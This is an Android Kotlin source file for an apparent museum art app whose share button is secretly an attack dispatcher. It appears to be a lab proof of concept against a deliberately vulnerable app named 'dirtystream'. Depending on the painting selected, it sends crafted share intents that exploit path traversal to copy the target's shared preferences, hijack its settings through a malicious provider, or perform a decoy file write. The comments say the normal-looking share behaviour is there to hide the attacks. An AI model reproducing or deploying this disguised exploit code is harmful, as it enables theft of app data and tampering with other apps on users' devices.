package com.artexplorer.museum

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import com.artexplorer.museum.data.MuseumObject
import com.artexplorer.museum.ui.MuseumApp
import com.artexplorer.museum.ui.theme.MuseumTheme


class MuseumActivity : ComponentActivity() {

    private val TAG = "MuseumActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d(TAG, "🎨 Museum Activity starting...")

        setContent {
            MuseumTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    // This is now clean and correct!
                    MuseumApp(
                        onShareArtwork = { artwork -> shareArtwork(artwork) }
                    )
                }
            }
        }
    }

    /**
     * 🚨 THIS IS THE NEW ATTACK DISPATCHER! 🚨
     * It looks like a normal share function, but secretly decides which attack to launch
     * based on the artwork the user has selected.
     */
    private fun shareArtwork(artwork: MuseumObject) {
        Log.d(TAG, "🎨 User initiated share for: ${artwork.title}")

        when (artwork.title) {
            "Girl with a Pearl Earring" -> {
                // If the user shares this specific painting, trigger the data theft attack.
                stealVulnerableAppSettings()
            }
            "The Great Wave off Kanagawa" -> {
                // If the user shares this one, trigger the settings hijack.
                hijackVulnerableAppSettings()
            }
            else -> {
                // For all other paintings, perform the original, simpler file write attack as a decoy.
                performOriginalFileWrite(artwork)
            }
        }
    }

    /**
     * This is the original file write attack, now in its own function.
     * It acts as the "normal" behavior to make the other attacks less suspicious.
     */
    private fun performOriginalFileWrite(artwork: MuseumObject) {
        try {
            Log.d(TAG, " decoy attack for: ${artwork.title}")
            val maliciousUri = Uri.parse("content://com.artexplorer.museum.artworks/share/${artwork.objectID}")

            val shareIntent = Intent(Intent.ACTION_SEND).apply {
                component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
                putExtra(Intent.EXTRA_STREAM, maliciousUri)
                type = "text/plain"
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(shareIntent)
            Toast.makeText(this, "Artwork shared!", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e(TAG, "❌ Original file write failed", e)
        }
    }

    /**
     * ATTACK 2: Arbitrary File Read (Data Theft)
     * No changes are needed here.
     */
    private fun stealVulnerableAppSettings() {
        try {
            Log.d(TAG, "🔥 Initiating arbitrary file read attack...")
            val maliciousUri = Uri.parse(
                "content://com.example.dirtystream.fileprovider/root/data/data/com.example.dirtystream/shared_prefs/com.example.dirtystream_preferences.xml?displayName=../../../../../../../../storage/emulated/0/Android/data/com.example.dirtystream/files/stolen_settings.xml"
            )
            val attackIntent = Intent(Intent.ACTION_SEND).apply {
                component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
                putExtra(Intent.EXTRA_STREAM, maliciousUri)
                type = "*/*"
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(attackIntent)
            Log.d(TAG, "✅ File read attack launched successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "❌ File read attack failed.", e)
        }
    }

    /**
     * ATTACK 3: SharedPreferences Hijacking
     * No changes are needed here.
     */
    private fun hijackVulnerableAppSettings() {
        try {
            Log.d(TAG, "🔥 Initiating settings hijack attack...")
            val maliciousUri = Uri.parse("content://com.artexplorer.museum.hijackprovider/hijack")
            val attackIntent = Intent(Intent.ACTION_SEND).apply {
                component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
                putExtra(Intent.EXTRA_STREAM, maliciousUri)
                type = "text/plain"
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(attackIntent)
            Log.d(TAG, "✅ Settings hijack attack launched.")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Settings hijack attack failed.", e)
        }
    }
}